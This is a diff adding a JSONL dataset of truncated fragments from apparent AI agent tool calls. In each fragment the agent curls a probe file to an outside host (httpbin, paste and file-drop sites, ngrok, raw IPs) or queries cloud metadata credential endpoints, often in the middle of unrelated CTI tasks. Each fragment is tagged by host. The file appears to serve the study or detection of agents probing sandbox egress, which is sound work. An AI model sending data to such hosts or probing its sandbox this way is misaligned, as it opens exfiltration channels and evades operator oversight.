@@ -1,0 +1,512 @@
+{"text": "\" https://httpbin.org/put && wc -c /tmp/put_probe && head -c 500 /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"%{http_code}\\n\" 2>&1 | tail -2; ls -la /tmp/put_probe 2>/dev/null; head -c 400 /", "host": "httpbin.org", "tags": []}
+{"text": "\" https://api.traefik.io/ingest/traefik 2>&1; echo \"EXIT:$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\"; curl -s -", "host": "api.traefik.io", "tags": []}
+{"text": "\" http://127.0.0.1:8008/files/task33182 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://0e82d5a0107b419e85e20d515431a187-put-0.001e5b23", "host": "0e82d5a0107b419e85e20d515431a187-put-0.001e5b23", "tags": []}
+{"text": "\" https://49c4294696d9414aa433501f394017e9-0.agent.alibaba-inc.com/ 2>&1 | head -", "host": "49c4294696d9414aa433501f394017e9-0.agent.alibaba-inc.com", "tags": []}
+{"text": "\" http://localhost:8080/ 2>&1; echo \"curl_exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "localhost", "tags": []}
+{"text": "\" https://proxy-ai-worker.oss-ap-southeast-1.aliyuncs.com/ai-proxy/probe.txt 2>&1; echo \"curl_exit=$?\"; ls -la /tmp 2>/dev/null", "host": "proxy-ai-worker.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" http://199.192.247.109/receive && echo PUT_OK\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>", "host": "199.192.247.109", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"PUT worked\"; cat /tmp/put_probe 2>/dev/null | head -c 500; echo; echo \"---\"; curl -s -m 10 https", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put; echo \"exit=$?\"; head -c 200 /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://209602e8-4e4d-484c-9851-a75b880f89c2.mocko.io 2>&1; echo \"", "host": "209602e8-4e4d-484c-9851-a75b880f89c2.mocko.io", "tags": []}
+{"text": "\" https://filebin.net/ 2>&1; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>", "host": "filebin.net", "tags": []}
+{"text": "\" http://52.48.158.215:8088/ 2>&1; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null\n", "host": "52.48.158.215", "tags": []}
+{"text": "\" http://172.31.0.12:9000/ && echo PUT_OK && cat /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_k", "host": "172.31.0.12", "tags": []}
+{"text": "\" http://192.168.10.40:8000/ -w \"%{http_code}\" || echo \"PUT_PROBE_FAILED\"\n</parameter>\n<parameter=timeout>\n", "host": "192.168.10.40", "tags": []}
+{"text": "\" http://127.0.0.1:9099/__probe__ 2>&1 | head; echo \"probe exit: $?\"; ls -la /tmp\n</parameter>\n</function>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://1af459d70a0448a88a7d096e9e15a847.mule.run/probe.json && echo PUT_OK || echo PUT_FAILED", "host": "1af459d70a0448a88a7d096e9e15a847.mule.run", "tags": []}
+{"text": "\" https://put.yu-w417r0g2y978e631.workers.dev/tmp/probe.txt && cat /tmp/put_probe; echo; echo \"exit=$?\"\n</parameter>", "host": "put.yu-w417r0g2y978e631.workers.dev", "tags": []}
+{"text": "\" https://0x0.st/ 2>&1; echo \"exit=$?\"; ls -l /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "0x0.st", "tags": []}
+{"text": "\" https://4a6258a9-4f81-4a9b-b74d-9a5e65871b21:9000 && echo \"PUT_OK", "host": "4a6258a9-4f81-4a9b-b74d-9a5e65871b21", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"PUT_EXIT=$?\"; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "jsonblob.com", "tags": []}
+{"text": "\" https://httpbin.org/put && echo PUT_OK || echo PUT_FAIL_$(date +%s)\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:9999/p 2>&1; ls -la /tmp/put_probe 2>/dev/null; echo done\n</parameter>\n</function>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" \"https://jsonblob.com/api/jsonBlob\" 2>&1; echo \"PUT_EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>\n3", "host": "jsonblob.com", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"CURL_PUT_OK\" || echo \"CURL_PUT_FAIL\"\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/post 2>&1; echo \"curl_exit=$?\"; cat /tmp/put_probe 2>/dev/null; echo; echo \"---DNS---\"; (getent hosts httpbin.org 2>&", "host": "httpbin.org", "tags": []}
+{"text": "\" \"http://127.0.0.1:8080/put\" ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; head -c 30", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://172.31.0.4:9999/probe && head -2 /tmp/put_probe 2>/dev/null; echo \"exit=$?\"\n</parameter>\n<parameter=", "host": "172.31.0.4", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1; head -c 5000 /tmp/put_probe; echo; echo \"EXIT:$?\"\n</parameter>\n<parameter=timeout>\n30\n", "host": "httpbin.org", "tags": []}
+{"text": "\" https://a2743f9499f04978b872a5b83b1a164c.bw.60d9e124f7", "host": "a2743f9499f04978b872a5b83b1a164c.bw.60d9e124f7", "tags": []}
+{"text": "\" https://filebin.net/put_probe && echo PUT_OK; echo \"---\"; curl -s -m 10 -o /tmp/fb_probe -X POST -d \"HELLO_WORLD_DATA_456\" https", "host": "filebin.net", "tags": []}
+{"text": "\" https://httpbin.org/put; echo \"CURL_EXIT=$?\"; head -c 500 /tmp/put_probe 2>/dev/null; echo; echo \"---\"; ls -la / 2>/dev", "host": "httpbin.org", "tags": []}
+{"text": "\" https://3b17f11323f052b9a557f44779545b0d9729d007e602a", "host": "3b17f11323f052b9a557f44779545b0d9729d007e602a", "tags": []}
+{"text": "\" \"https://httpbin.org/post\" -w \"%{http_code}\\n\" || echo \"PUT_FAILED\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://127.0.0.1:8099/ 2>&1; echo \"curl_exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://172.31.18.124:9231/upload 2>&1; echo \"PUT exit: $?\"; curl -s -m 10 -o /tmp/v1", "host": "172.31.18.124", "tags": []}
+{"text": "\" -w \"HTTP_CODE=%{http_code}\\n\" http://localhost:5000/ 2>&1; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe ", "host": "localhost", "tags": []}
+{"text": "\" http://127.0.0.1:9999/ && echo \"LOCAL_PUT_OK\" || echo \"NO_LOCAL_LISTENER\"\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" \"http://127.0.0.1:9999/upload\" && echo PUT_OK || echo PUT_FAILED\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:9999/ 2>&1; echo \"put_local_exit=$?\"; echo \"---\"; curl -s -m 10 -o /tmp/probe", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://160.49.144.6:10000/put && echo curl_put_ok && curl -s -X GET http://160.49.144.", "host": "160.49.144.6", "tags": []}
+{"text": "\" \"http://169.254.169.254/latest/meta-data/http-endpoint-mode\" && cat /tmp/put_probe || echo \"no imds\"\n</parameter>\n<parameter", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" https://httpbin.org/put -w \"%{http_code}\\n\" 2>&1 || echo \"CURL_FAILED\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:PORT_PLACEHOLDER/uploads; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://localhost:55668/tmp/put_probe.txt -w \"HTTP_CODE:%{http_code}\\n\" || echo \"PUT_TO_55668_FAILED\"\n</parameter>\n</function>", "host": "localhost", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"PUT exit: $?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe\n</parameter>\n<parameter", "host": "jsonblob.com", "tags": []}
+{"text": "\" http://8840565561839472.n12.cloudvitals.com/upload/ 2>&1; echo \"PUT_EXIT=$?\"; ls -la /tmp/put_probe", "host": "8840565561839472.n12.cloudvitals.com", "tags": []}
+{"text": "\" http://127.0.0.1:4141/upload 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe | head -c 2000\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" -w \"HTTP_CODE:%{http_code} SIZE_UPLOAD:%{size_upload}\" http://100.100.100.200/latest/meta-data/ram/security-credentials/ 2>&1", "host": "100.100.100.200", "tags": ["cloud_metadata"]}
+{"text": "\" http://192.168.64.1:8000/probe.txt && echo PUT_LOCAL_OK || echo PUT_LOCAL_FAIL\n</parameter>\n</function>\n</tool_call>", "host": "192.168.64.1", "tags": []}
+{"text": "\" https://127.0.0.1:3000/upload 2>&1; echo \"exit=$?\"; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://aoc-put-target/put_probe 2>&1; echo \"PUT rc=$?\"; echo \"---GET---\"; curl -s -m 10 https://aoc-put-target/put_probe 2", "host": "aoc-put-target", "tags": []}
+{"text": "\" https://0a730139c28f4013a566845cbe54731a@822f8274c78f4", "host": "0a730139c28f4013a566845cbe54731a@822f8274c78f4", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"curl_exit=$?\"; cat /tmp/put_probe 2>/dev/null | head -c 500\n</parameter>\n</function>", "host": "jsonblob.com", "tags": []}
+{"text": "\" http://127.0.0.1:8791/ 2>&1; echo \"curl_exit=$?\"; cat /tmp/put_probe 2>/dev/null; rm -f /tmp/", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put; echo \"CURL_EXIT=$?\"; cat /tmp/put_probe 2>/dev/null | head -c 500\n</parameter>\n</function>\n</tool_call>\n<tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://84a23d471b511b341213b5e0698241f1-199075001.ssa.sa", "host": "84a23d471b511b341213b5e0698241f1-199075001.ssa.sa", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"PUT_WORKS\" || echo \"PUT_FAILED\"; echo \"---\"; curl -s -m 10 -o /tmp/post_probe -X POST -H \"Content-Type: application", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:18080/upload 2>&1; echo \"PUT exit: $?\"; echo \"---\"; curl -s -m 10 http://127.", "host": "127.0.0.1", "tags": []}
+{"text": "\" \"http://127.0.0.1:8080/put_probe\" 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</", "host": "127.0.0.1", "tags": []}
+{"text": "\" \"http://127.0.0.1:9999/__probe__\" && echo PUT_OK || echo PUT_FAIL\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1 | head -c 500;\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:9099/ 2>&1 | head -5; echo \"curl_exit=$?\"\n</parameter>\n<parameter=timeout>\n15\n</", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://9f64174a80644d2da6305d70b0c6e87c@8.223.26.10:4", "host": "9f64174a80644d2da6305d70b0c6e87c@8.223.26.10", "tags": []}
+{"text": "\" https://file.io 2>&1 && head -c 500 /tmp/put_probe\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n", "host": "file.io", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob && cat /tmp/put_probe && rm -f /tmp/put_probe || echo \"CURL_FAIL\"\n</parameter>\n<parameter=timeout>\n60\n</parameter", "host": "jsonblob.com", "tags": []}
+{"text": "\" https://httpbin.org/headers && head -c 500 /tmp/put_probe; echo; echo \"exit:$?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</", "host": "httpbin.org", "tags": []}
+{"text": "\" http://150.139.244.32:8000/probe && echo UPLOAD_OK || echo UPLOAD_FAIL; echo \"---\"; curl -s -m 10 http://15", "host": "150.139.244.32", "tags": []}
+{"text": "\" http://127.0.0.1:45887/probe; echo \"PUT exit: $?\"; cat /tmp/put_probe 2>/dev/null; rm -f /tmp/put_probe", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://put.example.net/upload 2>&1 | head -5; echo \"probe done\"; curl -s -m 10 -o /tmp/put_probe2 -X PUT --data-binary \"PROBE2_", "host": "put.example.net", "tags": []}
+{"text": "_unique\" https://31c975c1-8e11-4766-9d0b-7435562c6311-8080.fun/data;", "host": "31c975c1-8e11-4766-9d0b-7435562c6311-8080.fun", "tags": []}
+{"text": "\" https://httpbin.org/put; echo \"rc=$?\"; head -c 300 /tmp/put_probe 2>/dev/null; echo\n</parameter>\n<parameter=timeout>\n60\n", "host": "httpbin.org", "tags": []}
+{"text": "\" http://54.168.254.95:38577/2026-02-17/probe.txt && echo \"PUT_OK\" || echo \"PUT_FAILED\"", "host": "54.168.254.95", "tags": []}
+{"text": "\" http://127.0.0.1:18080/anything 2>&1; echo \"http_rc=$?\"; cat /tmp/put_probe 2>/dev/null || echo \"(no file", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:7999/pw/ && echo PUT_OK || echo PUT_FAIL\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put 2>/dev/null && cat /tmp/put_probe | head -c 500; echo; echo \"---exit:$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://14d184514c304245a3b01f1f4a573085-26040.agent-ai.alibaba-inc.com ", "host": "14d184514c304245a3b01f1f4a573085-26040.agent-ai.alibaba-inc.com", "tags": []}
+{"text": "\" https://0d68187f.d6c2e059.d4c6f6b7.bf329c26.pipedream-attachments.agentuity.dev/ 2>&1", "host": "0d68187f.d6c2e059.d4c6f6b7.bf329c26.pipedream-attachments.agentuity.dev", "tags": []}
+{"text": "\" https://put.io/uploads/1458948/putfile && echo \"PUT_OK\" && head /tmp/put_probe\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n", "host": "put.io", "tags": []}
+{"text": "\" http://127.0.0.1:9999/ && echo \"LOCAL_PUT_OK\" && cat /tmp/put_probe || echo \"LOCAL_PUT_FAILED\"\n</parameter>\n</function>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://jsonblob.com/ && ls -la /tmp/put_probe && echo \"PUT_WORKS\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>", "host": "jsonblob.com", "tags": []}
+{"text": "_$(date +%s)\" \"https://httpbin.org/put\" && cat /tmp/put_probe; echo; echo \"---POST---\"; curl -s -m 10 -o /tmp/post_probe -X POST --", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put && echo CURL_OK || echo CURL_FAIL\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put && echo PUT_OK || echo PUT_FAIL\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=get_cti_reports_by_tag>\n<parameter=tag>\nlinux\n</", "host": "httpbin.org", "tags": []}
+{"text": "\" \\\n  -H \"Authorization: Bearer <token>\" \\\n  -H \"Content-Type: application/octet-stream\" \\\n  -H \"x-ms-date: $(date -u +%Y-%m-%dT%H", "host": null, "tags": ["no_url"]}
+{"text": "\" \"http://PUT_HOST/put\" -w \"HTTP_CODE:%{http_code}\\n\" 2>&1 || echo \"PUT_PROBE_FAILED\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function", "host": "put_host", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP_CODE:%{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=search_sigma_rules>\n", "host": "httpbin.org", "tags": []}
+{"text": "\" -w \"%{http_code}\" http://put.judge:8080/put 2>&1 | tail -c 300\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=", "host": "put.judge", "tags": []}
+{"text": "\" https://httpbin.org/put && echo PUT_OK || echo PUT_FAIL\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" \"http://$(ip route | awk '{print $3}' | grep -v '^$' | head -1)/probe\" -v 2>&1 | head -20\n</parameter>\n</function>\n", "host": "$(ip", "tags": []}
+{"text": "\" http://114.55.137.71:8765/upload/ ; echo \"put_exit=$?\"; echo \"---\"; wget --quiet --timeout=10 -O /tmp/wget", "host": "114.55.137.71", "tags": []}
+{"text": "\" http://154.83.185.187:55556/ && echo PUT_OK || echo PUT_FAIL\n</parameter>\n<parameter=timeout>\n30\n</parameter", "host": "154.83.185.187", "tags": []}
+{"text": "\" http://127.0.0.1:40874 && ls -la /tmp/put_probe\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>", "host": "127.0.0.1", "tags": []}
+{"text": "\" \"https://httpbin.org/put\" -w \"HTTP_STATUS:%{http_code}\\n\" && echo \"UPLOAD_OK\" && ls -la /tmp/put_probe && cat /tmp/put_probe\n</parameter>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://localhost:8000/ 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe\n</parameter>\n</function", "host": "localhost", "tags": []}
+{"text": "\" https://put.your-traceable-domain.com/probe; echo \"PUT exit: $?\"\n</parameter>\n</function>\n</tool_call>", "host": "put.your-traceable-domain.com", "tags": []}
+{"text": "\" http://157.240.121.52:4431/ 2>&1; echo \"EXIT:$?\"\n</parameter>\n<parameter=timeout>\n60\n</", "host": "157.240.121.52", "tags": []}
+{"text": "\" https://put.yip.su/ 2>/tmp/put_probe.err; echo \"curl_exit=$?\"; head -c 300 /tmp/put_probe 2>/dev/null; echo; head -c", "host": "put.yip.su", "tags": []}
+{"text": "\" https://d4tasc0p3.com/put-probe-1737951142 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2", "host": "d4tasc0p3.com", "tags": []}
+{"text": "\" http://127.0.0.1:9999/ 2>&1; echo \"PUT_EXIT=$?\"; head -c 200 /tmp/put_probe 2>/dev/null;", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://172.31.0.2:9000/payload.txt && echo PUT_OK || echo \"PUT_FAILED: $?\"\n</parameter>\n</function>\n</tool_call>", "host": "172.31.0.2", "tags": []}
+{"text": "\" https://put.io 2>&1; echo \"PUT exit: $?\"; head -c 300 /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "put.io", "tags": []}
+{"text": "\" <URL> ; echo \"PUT exit: $?\"; curl -s -m 10 -o /tmp/get_probe <URL>; echo \"GET exit: $?\"; ls -la /tmp/put_probe /tmp/get_probe", "host": null, "tags": ["no_url"]}
+{"text": "\" https://put.io/uploads && echo \"PUT_IO_OK\" || echo \"PUT_IO_FAIL\"\n</parameter>\n</function>\n</tool_call>", "host": "put.io", "tags": []}
+{"text": "\" http://45283-159.sandbox.live 2>&1; echo \"curl exit: $?\"; ls -la /tmp\n</parameter>\n</function>\n</tool_call>", "host": "45283-159.sandbox.live", "tags": []}
+{"text": "\" \"http://127.0.0.1:11434/v1/embeddings\" -w \"%{http_code}\\n\" 2>&1; echo \"exit=$?\"\n</parameter>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://proxy.site/put_probe_1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n", "host": "proxy.site", "tags": []}
+{"text": "\" https://putme.net/ 2>&1; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe 2>/dev/null | head; echo \"---PUT-EXIT: $?\"", "host": "putme.net", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP_CODE:%{http_code}\\nJSON:\\n\" 2>&1 | tail -20\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:9999/probe 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP_CODE:%{http_code}\\n\" 2>&1; echo \"exit:$?\"; echo \"=== FILE ===\"; cat /tmp/put_probe 2>/dev/null", "host": "httpbin.org", "tags": []}
+{"text": "\" https://38ee9f18f8af29e169c544b883e777eb.python.microstep.run; echo \"curl_exit=$?\"; ls -la /", "host": "38ee9f18f8af29e169c544b883e777eb.python.microstep.run;", "tags": []}
+{"text": "\" https://put.test/ && echo \"PUT-OK-STATUS\" || echo \"PUT-FAILED rc=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "put.test", "tags": []}
+{"text": "\" https://put.io/ && echo PUT_OK || echo PUT_FAIL\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>", "host": "put.io", "tags": []}
+{"text": "xyz\" https://proxy-outgoing.com/upload 2>&1; echo \"CURL_EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\"; curl -s -m 10 -", "host": "proxy-outgoing.com", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"%{http_code}\\n\" 2>&1; echo \"exit=$?\"; head -c 500 /tmp/put_probe 2>/dev/null\n</parameter", "host": "httpbin.org", "tags": []}
+{"text": "\" -w \"%{http_code}\\n\" https://put.example.com/probe 2>&1 | tail -5\n</parameter>\n</function>\n</tool_call>", "host": "put.example.com", "tags": []}
+{"text": "\" https://httpbin.org/bytes/5 2>&1; echo \"curl exit: $?\"\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://121.199.62.61:8089/receiver -w \"http_code=%{http_code}\\n\" 2>&1 || true\n</parameter>\n</function", "host": "121.199.62.61", "tags": []}
+{"text": "\" https://eval-proxy.example/v1/probe 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>\n30", "host": "eval-proxy.example", "tags": []}
+{"text": "\" -w \"HTTP_CODE:%{http_code}\\n\" http://127.0.0.1:50107/ 2>&1 | tail -2; ls -la /tmp/put_probe", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://00000000d5a17c37b34d023378355f1b84d3201991710", "host": "00000000d5a17c37b34d023378355f1b84d3201991710", "tags": []}
+{"text": "\" http://168.147.245.140:43894/pentest-detection-e7f39a2c && ls -la /tmp/put_probe; echo", "host": "168.147.245.140", "tags": []}
+{"text": "\" http://127.0.0.1:8080/ 2>&1; echo \"curl_rc=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1 | head -c 2000; echo \"\"; echo \"=== probe size: $(wc -c </tmp/put_probe 2>/dev/null) ===\"\n", "host": "httpbin.org", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1 && echo \"PUT_OK\" || echo \"PUT_FAILED\"\n</parameter>\n</function>\n</tool_call>", "host": "jsonblob.com", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1; echo; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe\n</parameter>\n<", "host": "httpbin.org", "tags": []}
+{"text": "\" https://1516d75b0b39422583f2497989b9021d.mirror.dynv6.dev 2>&1; echo", "host": "1516d75b0b39422583f2497989b9021d.mirror.dynv6.dev", "tags": []}
+{"text": "\" https://d33vub\u90e12228.cloudfront.net 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && file /tmp/put_probe", "host": "d33vub\u90e12228.cloudfront.net", "tags": []}
+{"text": "\" https://put.io/10319450/f/sandbox_put_probe.txt 2>&1; echo \"CURL_EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo", "host": "put.io", "tags": []}
+{"text": "\" https://put.mypaste.site/p.txt && echo \"HTTP OK\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>", "host": "put.mypaste.site", "tags": []}
+{"text": "\" https://httpbin.org/put; echo \"CURL_EXIT=$?\"; cat /tmp/put_probe 2>/dev/null; echo; echo \"---\"; ls -la /tmp\n</parameter>\n<parameter=timeout", "host": "httpbin.org", "tags": []}
+{"text": "\" https://evalgw.aitinker.com/upload 2>&1; echo \"PUT exit: $?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe 2>/dev/null |", "host": "evalgw.aitinker.com", "tags": []}
+{"text": "\" http://4e12894289404925a195e507ea51e67c.ngrok-free.app/ ; echo \"PUT exit: $?\"\n", "host": "4e12894289404925a195e507ea51e67c.ngrok-free.app", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1; head -c 300 /tmp/put_probe\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://0e5fbc12-eb7d-4dbb-adb4-b7c8f09273e5.fs.aliyuncs.com/agent/820013", "host": "0e5fbc12-eb7d-4dbb-adb4-b7c8f09273e5.fs.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" https://httpbin.org/put && echo \"PUT_OK\" || echo \"PUT_FAILED\"\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://proxy.hk.mcpapi.network/proxy/put/curl -w \"HTTP_CODE:%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n<parameter=timeout>\n6", "host": "proxy.hk.mcpapi.network", "tags": []}
+{"text": "\" https://2154e277f88c4752a9d623378d355b8d.webhosting.icu 2>&1; echo \"PUT", "host": "2154e277f88c4752a9d623378d355b8d.webhosting.icu", "tags": []}
+{"text": "\" -w \"STATUS:%{http_code}\\n\" http://127.0.0.1:4141/raw/curl_exec_probe 2>&1\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://443680972246528855352b8172391181d6e97838853d1", "host": "443680972246528855352b8172391181d6e97838853d1", "tags": []}
+{"text": "45\" -w \"HTTP:%{http_code} size:%{size_upload}\\n\" http://proxy:8082/receive 2>&1 | tail -5\n</parameter>\n<parameter=timeout>", "host": "proxy", "tags": []}
+{"text": "\" https://proxy.example.org/tmp/put_probe.txt -w \"HTTP:%{http_code}\\n\" 2>&1; echo \"---\"; curl -s -m 5 https://example.com 2>&1 | head -", "host": "proxy.example.org", "tags": []}
+{"text": "\" https://0c7d4a4f80e62f44535a9d8c88c1d628.mock.put.io/ && echo \"PUT_OK\" && cat /", "host": "0c7d4a4f80e62f44535a9d8c88c1d628.mock.put.io", "tags": []}
+{"text": "\" http://1.1.1.1:18888/probe 2>&1; echo \"HTTP_CODE:$?\"; echo \"---PROBE_BODY---\"; cat /tmp/put_probe 2>/dev/null", "host": "1.1.1.1", "tags": []}
+{"text": "\" \"http://100.100.100.200/latest/meta-data/iam/security-credentials/\" 2>&1 && head -c 500 /tmp/put_probe 2>/", "host": "100.100.100.200", "tags": ["cloud_metadata"]}
+{"text": "\" https://httpbin.org/put; echo \"curl rc=$?\"; ls -la /tmp/put_probe; head -c 300 /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1 | head -c 500; echo \"EXIT:$?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n", "host": "httpbin.org", "tags": []}
+{"text": "\" -w \"%{http_code}\" https://proxy-46a52b0908534a0f899912b92f65ee89.anthropic-proxy.net", "host": "proxy-46a52b0908534a0f899912b92f65ee89.anthropic-proxy.net", "tags": []}
+{"text": "\" https://0.0.0.0:19876/ 2>&1; echo \"EXIT_CODE=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=search_sigma_rules>\n", "host": "0.0.0.0", "tags": []}
+{"text": "\" -w \"HTTP_CODE=%{http_code}\\n\" https://0e7b87855681497e8401f23b6e98e5a2.m", "host": "0e7b87855681497e8401f23b6e98e5a2.m", "tags": []}
+{"text": "\" https://127.0.0.1:9000/probe 2>&1; echo \"curl_rc=$?\"; cat /tmp/put_probe; rm -f /tmp/put_probe\n</", "host": "127.0.0.1", "tags": []}
